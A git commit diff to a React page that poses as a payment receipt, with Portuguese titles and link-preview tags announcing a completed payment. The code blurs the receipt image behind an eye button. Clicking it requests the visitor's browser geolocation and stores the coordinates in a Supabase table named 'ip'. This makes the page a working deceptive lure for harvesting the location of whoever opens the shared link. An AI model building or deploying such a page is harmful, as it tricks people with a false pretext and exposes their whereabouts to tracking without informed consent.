1bdf8fe3605a30c8fe6d0cf862b2c69e292a98ac
Rafael Pereira <rafaelsantospereira03@gmail.com>
2025-02-26 15:31:04 -0300

    update

--- src/pages/home.tsx
+++ src/pages/home.tsx
@@ -1,76 +1,88 @@
-import { useEffect } from 'react'
+/* eslint-disable @typescript-eslint/no-unused-vars */
+import { EyeIcon } from 'lucide-react'
+import { useState } from 'react'
 import { Helmet } from 'react-helmet-async'
 
 import { supabase } from '../@config/supabase'
 
 export const Home = () => {
-  useEffect(() => {
-    const requestLocationPermission = async () => {
-      if (!('geolocation' in navigator) || !('permissions' in navigator)) {
-        console.log('Geolocalização não suportada pelo navegador.')
-        return
-      }
+  const [_, setLocationPermission] = useState<'idle' | 'granted' | 'denied'>(
+    'idle',
+  )
 
-      try {
-        const permissionStatus = await navigator.permissions.query({
-          name: 'geolocation',
-        })
+  const [hasToggleButtonLocation, setHasToggleButtonLocation] = useState(true)
 
-        if (permissionStatus.state === 'granted') {
-          getUserLocation()
-        } else if (permissionStatus.state === 'prompt') {
-          navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              await saveLocation(position)
-            },
-            (err) => {
-              console.error('Erro ao obter localização:', err)
-            },
-          )
-        } else {
-          console.warn('Permissão de localização negada.')
-        }
-      } catch (error) {
-        console.error('Erro ao verificar permissão de localização:', error)
-      }
+  const requestLocationPermission = async () => {
+    if (!('geolocation' in navigator) || !('permissions' in navigator)) {
+      console.log('Geolocalização não suportada pelo navegador.')
+      setLocationPermission('denied')
+      return
     }
 
-    const getUserLocation = () => {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          await saveLocation(position)
-        },
-        (err) => {
-          console.error('Erro ao obter localização:', err)
-        },
-      )
-    }
+    try {
+      const permissionStatus = await navigator.permissions.query({
+        name: 'geolocation',
+      })
 
-    const saveLocation = async (position: GeolocationPosition) => {
-      try {
-        await supabase.from('ip').insert([
-          {
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
+      if (permissionStatus.state === 'granted') {
+        setLocationPermission('granted')
+        getUserLocation()
+      } else if (permissionStatus.state === 'prompt') {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            setLocationPermission('granted')
+            await saveLocation(position)
           },
-        ])
-      } catch (error) {
-        console.error('Erro ao salvar localização no banco:', error)
+          (err) => {
+            console.error('Erro ao obter localização:', err)
+            setLocationPermission('denied')
+          },
+        )
+      } else {
+        console.warn('Permissão de localização negada.')
+        setLocationPermission('denied')
       }
+    } catch (error) {
+      console.error('Erro ao verificar permissão de localização:', error)
+      setLocationPermission('denied')
     }
+  }
 
-    requestLocationPermission()
-  }, [])
+  const getUserLocation = () => {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        await saveLocation(position)
+      },
+      (err) => {
+        console.error('Erro ao obter localização:', err)
+        setLocationPermission('denied')
+      },
+    )
+  }
+
+  const saveLocation = async (position: GeolocationPosition) => {
+    try {
+      await supabase.from('ip').insert([
+        {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+        },
+      ])
+
+      setHasToggleButtonLocation(false)
+    } catch (error) {
+      console.error('Erro ao salvar localização no banco:', error)
+    }
+  }
 
   return (
-    <main className="flex min-h-screen items-center justify-center bg-zinc-50">
+    <main className="flex min-h-screen flex-col items-center justify-center gap-4 bg-zinc-50">
       <Helmet title="Comprovante de pagamento disponível">
         <meta property="og:title" content="Pagamento concluído com sucesso" />
         <meta
           property="og:description"
           content="Seu pagamento foi concluído com sucesso. Caso queira ver o comprovante, basta acessar o link."
         />
-
         <meta
           property="og:image"
           content="https://i.pinimg.com/736x/f9/fe/50/f9fe50dbdfd23e12ad00f3ddad477b8c.jpg"
@@ -82,11 +94,20 @@ export const Home = () => {
         <meta property="og:image:type" content="image/jpg" />
         <meta property="og:image:width" content="635" />
         <meta property="og:image:height" content="476" />
-
         <meta property="og:type" content="website" />
       </Helmet>
 
-      <div className="overflow-hidden rounded-2xl border">
+      <div className="relative overflow-hidden rounded-2xl border">
+        {hasToggleButtonLocation && (
+          <div className="absolute left-0 top-0 flex h-full w-full items-center justify-center backdrop-blur-sm">
+            <button
+              onClick={requestLocationPermission}
+              className="rounded-md bg-blue-600 p-4 text-white hover:bg-blue-700"
+            >
+              <EyeIcon className="size-7" />
+            </button>
+          </div>
+        )}
         <img
           src="/comprovante.png"
           alt="Comprovante de pagamento"
